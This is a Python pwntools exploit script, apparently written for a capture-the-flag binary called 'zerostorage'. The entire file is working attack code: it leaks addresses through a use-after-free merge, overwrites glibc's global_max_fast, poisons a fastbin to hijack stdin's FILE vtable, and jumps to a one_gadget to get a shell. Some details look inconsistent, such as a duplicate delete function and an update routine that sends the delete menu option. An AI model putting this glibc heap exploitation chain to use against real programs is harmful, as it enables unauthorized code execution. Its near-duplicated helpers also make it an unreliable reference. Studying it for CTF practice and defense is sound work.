from pwn import *
from heaputils import *

def get_prompt():
	return p.recvuntil("Your choice: ")

def insert(data,interact=False):
	p.sendline("1")
	p.recvuntil("Length of new entry: ")
	p.sendline(str(len(data)))
	if interact:
		p.interactive()
		return
	p.recvuntil("Enter your data: ")
	p.send(data)
	get_prompt()

def delete(idx):
	p.sendline("2")
	p.recvuntil("Entry ID: ")
	p.sendline(str(idx))
	get_prompt()

def merge(idx1,idx2):
	p.sendline("3")
	p.recvuntil("Merge from Entry ID: ")
	p.sendline(str(idx1))
	p.recvuntil("Merge to Entry ID: ")
	p.sendline(str(idx2))
	get_prompt()

def view(idx):
	p.sendline("5")
	p.recvuntil("Entry ID: ")
	p.sendline(str(idx))
	p.recvuntil("Entry No.%d:\n"%idx)
	data = p.recvline().strip("\n")
	get_prompt()
	return data

def update(idx,data):
	p.sendline("2")
	p.recvuntil("Entry ID: ")
	p.sendline(str(idx))
	p.recvuntil("Length of entry: ")
	p.sendline(str(len(data)))
	p.recvuntil("Enter your data: ")
	p.send(data)
	get_prompt()

def delete(idx):
	p.sendline("4")
	p.recvuntil("Entry ID: ")
	p.sendline(str(idx))
	get_prompt()

def print_structs(cnt):
	start = PIE + 0x203060
	for i in range(cnt):
		ptr = start + i*0x18
		data = p.leak(ptr,0x18)
		valid = u32(data[:4])
		length = u64(data[8:16])
		buf = u64(data[16:24])^xorkey
		print("entry %d: valid-bit: 0x%x\nlength: 0x%x\naddr: 0x%016x"%(i,valid,length,buf))
		print("="*40)

def debug():
	global p,xorkey,PIE
	libc = ELF("./libc.so.6")
	p = process("./zerostorage",env={"LD_PRELOAD":"./libc.so.6"})

	PIE = get_PIE(p)

	xorkey = u64(p.leak(PIE+0x203048,8))
	log.info("xorkey: 0x%016x"%xorkey)

	insert("A"*0x8)
	insert("B"*(0xe8/2))

	merge(0,0)
	data = view(2)

	main_arena_top = u64(data[:8])
	LIBC = main_arena_top + 0x7f4782d31000 - 0x7f47830ef7b8
	target = LIBC + 0x3C0B40

	original_val = u64(p.leak(target,8))

	log.info("LIBC: 0x%x"%LIBC)
	log.info("main_arena.top: 0x%x"%main_arena_top)

	update(2,p64(0xdeadbeef)+p64(target - 0x10))
	insert("C"*0x8)

	new_val = u64(p.leak(target,8))

	log.success("global_max_fast overwritten: 0x%x --> 0x%x"%(original_val,new_val))
	log.success("now all bins are managed as fastbins")
	#fastbin poisoning time

	merge(1,1)
	
	'''
	targets = get_fastbin_targets(p)

	for addr,size,syms in targets:
		log.info("0x%x: 0x%02x [%s]"%(addr,size,syms))
	'''

	fd = LIBC + 0x3bf6bf - 0x8 #size: 0xFF(0xF0)

	log.info("our fake fastbin located at: 0x%x"%fd)

	data = p64(fd)+p64(0)
	update(3,data.ljust(0xe0,"\x00"))

	bp = PIE + 0x177C
	#gdb.attach(p,gdbscript="b * 0x%x"%bp)

	insert("\xcc"*0xe0)

	# overwrote stdin's vtable

	io_flush_lockp = 0x7BF10 + LIBC
	bp = LIBC + 0x7C05B

	fake_wide_data = LIBC + 0x7f05dc50a6b0 - 0x7f05dc14b000 - 0x18
	vtable = LIBC + 0x7f36a3236720 - 0x7f36a2e77000 - 0x18
	one_gadget = LIBC + 0xe681d
	
	payload = "A" + p64(0xdeadbeef)*3 + p64(fake_wide_data) + p64(0xdeadbeef)*3 + p64(1) #setting mode to 1 and forging wide_data structure
	payload += p64(0xcafebebe)*2 + p64(vtable) + p64(one_gadget)

	insert(payload.ljust(0xe0,"\x00"))
	#gdb.attach(p,gdbscript = "b *0x%x"%bp)
	
	# trigger malloc_printerr
	insert("A"*0x100,interact=True)
	p.interactive()

if __name__ == "__main__":
	debug()